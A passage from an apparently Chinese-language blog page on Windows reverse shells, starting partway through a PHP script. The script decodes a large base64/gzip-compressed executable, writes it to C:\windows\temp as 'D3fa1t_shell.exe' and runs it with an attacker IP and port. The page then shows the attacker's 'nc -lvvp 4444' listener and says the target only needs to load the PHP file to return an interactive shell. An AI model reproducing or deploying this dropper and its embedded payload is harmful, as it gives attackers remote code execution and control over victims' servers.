$payload = "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";$evalCode = gzinflate(base64_decode($payload));$evalArguments = " ".$port." ".$ip;$tmpdir ="C:\windows\temp";chdir($tmpdir);$res .= "Using dir : ".$tmpdir;$filename = "D3fa1t_shell.exe";$file = fopen($filename, 'wb');fwrite($file, $evalCode);fclose($file);$path = $filename;$cmd = $path.$evalArguments;$res .= "nnExecuting : ".$cmd."n";echo $res;$output = system($cmd);                
?&gt;</code></pre> 
<p style="margin-left:0;"><a name="6198-1648805406917"></a></p> 
<p style="margin-left:0;"><a name="9420-1649228138673"></a><strong>攻击机监听：</strong></p> 
<pre><code class="language-bash">nc -lvvp 4444</code></pre> 
<p style="margin-left:0;"><a name="7533-1649228202253"></a><strong>目标机执行：</strong>目标机在php环境下访问此php文件即可生成交互式反弹shell</p> 
<p style="margin-left:0;"><a name="5048-1649228138901"></a></p> 
<p style="margin-left:0;"><a name="6077-1649228251189"></a><strong>攻击机：</strong></p> 
<p style="margin-left:0;"><a name="1376-1649228279081"></a><img alt="" height="933" src="https://images2.imgbox.com/8a/4d/LMl2AE3q_o.png" width="1028"></p> 
<p style="margin-left:0;"><a name="7726-1648859826943"></a></p> 
<p style="margin-left:0;"><a name="7775-1648859827115"></a></p> 
<p style="margin-left:0;"><a name="9884-1648859827291"></a>参考：<a href="https://www.anquanke.com/post/id/99793#h2-9" rel="nofollow" title="powershell反弹shell常见方式 - 安全客，安全资讯平台">powershell反弹shell常见方式 - 安全客，安全资讯平台</a></p> 
<p style="margin-left:0;"><a name="7342-1648859842093"></a>      <a href="http://cn-sec.com/archives/282269.html" rel="nofollow" title="反弹shell之Windows反向shell | CN-SEC 中文网">反弹shell之Windows反向shell | CN-SEC 中文网</a></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0e6d5af1ecb37827f0fa8ff652396594/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">查看自己电脑是否有GPU查看电脑GPU型号</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a3417e2f50aca85d85c4fe706e0d3fe5/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">ClassNotFoundException: org.springframework.boot.configurationprocessor.json.JSONException</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>